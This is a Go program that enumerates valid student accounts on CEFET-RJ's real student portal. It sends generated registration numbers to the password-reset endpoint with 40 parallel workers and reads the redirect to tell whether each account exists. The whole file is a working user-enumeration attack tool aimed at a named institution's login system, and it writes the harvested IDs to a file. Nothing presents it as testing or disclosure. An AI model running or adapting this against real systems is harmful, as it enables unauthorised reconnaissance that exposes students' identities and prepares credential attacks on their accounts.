package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
)

func printUsage() {
	fmt.Println("Usage: scrape <ano> <curso> <start> <end>")
	fmt.Println("  <ano>   : Format for the year (e.g., '1900 or 2200')")
	fmt.Println("  <curso> : Course code (e.g., 'ELTINT or ADMN')")
	fmt.Println("  <start> : Start range (e.g., '100')")
	fmt.Println("  <end>   : End range (e.g., '1000')")
	os.Exit(1)
}

func scrapeMatricula(matricula string, curso string, client *http.Client, wg *sync.WaitGroup, results chan<- string) {
	defer wg.Done()

	subject := matricula + curso

	baseURL := "https://alunos.cefet-rj.br/usuario/publico/usuario/solicitacaonovasenha.action"

	data := url.Values{}
	data.Set("usuario", subject)

	req, err := http.NewRequest("POST", baseURL, strings.NewReader(data.Encode()))
	if err != nil {
		log.Println("Failed to create request:", err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		log.Println("Request failed:", err)
		return
	}

	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Println("Failed to close response body:", err)
		}
	}(resp.Body)

	if resp.StatusCode != http.StatusFound {
		log.Println("HTTP error:", resp.StatusCode)
		return
	}

	location := resp.Header.Get("Location")
	if location != "" {
		if strings.Contains(location, "errorUsuario") {
			fmt.Printf("%s nao existe\n", subject)
		} else {
			fmt.Printf("%s existe\n", subject)
			results <- subject // Send the valid matricula to the results channel
		}
	} else {
		log.Println("No Location header found")
	}
}

func main() {
	if len(os.Args) < 5 {
		printUsage()
	}

	ano := os.Args[1] + "%d"
	curso := os.Args[2]
	start := os.Args[3]
	end := os.Args[4]

	startInt, err := strconv.Atoi(start)
	if err != nil {
		log.Fatalln("Invalid start value:", err)
	}
	endInt, err := strconv.Atoi(end)
	if err != nil {
		log.Fatalln("Invalid end value:", err)
	}

	results := make(chan string, 100)
	workerLimit := make(chan struct{}, 40)

	var wg sync.WaitGroup

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	file, err := os.Create("results" + ano + curso + ".txt")
	if err != nil {
		log.Fatalln("Failed to create file:", err)
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	defer writer.Flush()

	for matricula := startInt; matricula < endInt; matricula++ {
		workerLimit <- struct{}{}
		wg.Add(1)
		go func(matricula int) {
			defer func() { <-workerLimit }()
			scrapeMatricula(fmt.Sprintf(ano, matricula), curso, client, &wg, results)
		}(matricula)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	fmt.Println("EXISTENTES:")
	for result := range results {
		_, err := writer.WriteString(result + "\n")
		if err != nil {
			log.Println("Failed to write to file:", err)
		}
		fmt.Println(result)
	}
}
